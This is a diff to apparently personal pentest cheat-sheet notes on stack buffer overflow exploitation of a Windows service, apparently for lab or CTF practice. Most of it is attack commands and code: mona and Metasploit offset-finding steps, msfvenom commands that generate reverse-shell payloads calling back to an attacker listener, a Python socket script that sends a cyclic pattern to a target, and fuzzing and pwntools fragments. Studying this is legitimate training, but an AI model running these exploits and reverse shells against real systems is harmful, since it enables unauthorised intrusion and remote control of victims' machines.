@@ -1,14 +1,14 @@
 # Buffer Overflow
-
  Write more than the capacity of the memory
 - Generating cyclic patterns
   - /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
 
 - [Buffer overflow Cheat Sheet](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
 
+## Requeriments
+If .exe windows machine
 
 ## Methods
-
 1. Connect to target: **nc 10.10.9.228 1337**
 2. Define local folder for mona: **!mona config -set workingfolder c:\Users\admin\Desktop\patota**
 3. Send characters to find offsed: **python3 fuzzer.py**
@@ -17,7 +17,6 @@
 
 4. Find offset: !mona findmsp -distance DISTANCE == Find Offset EIP
 4. Fider ofsset 2: /usr/bin/msf-pattern_offset -l DISTANCE -q EIP Register
-
 5. Set new return after offset: **retn = BBBB**
 6. Set list o chars excluding badhchar: **!mona bytearray -b "\x00"**
 
@@ -44,8 +43,28 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -b "\x00" -f c
 msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -e x86/shikata_ga_nai -f py -b "\x00"
 ```
 
-## GDB
+- Send patterns
+```
+#!/usr/bin/python
 
+import socket
+
+host = "192.168.178.56"
+port = 31337
+
+# msf-pattern_create -l 200
+# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+
+io=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+io.connect((host, port))
+io.send(pattern + "\n")
+
+io.close()
+
+```
+
+## GDB
 ```
 from pwn import *
 
@@ -86,7 +105,6 @@ print(payload)
   - python -c "print 'NOP'*no_of_nops + 'shellcode' + 'random_data'*no_of_random_data + 'memory address'"
 
 ## PWN Tools
-
 - Debug exploit
 - Commands
   - Stack canaries: detection of stack overflow
@@ -169,6 +187,10 @@ while True:
     sys.exit(0)
   string += 100 * "A"
   time.sleep(1)
+```
+
+```
+
 ```
 
 ## Script Strings
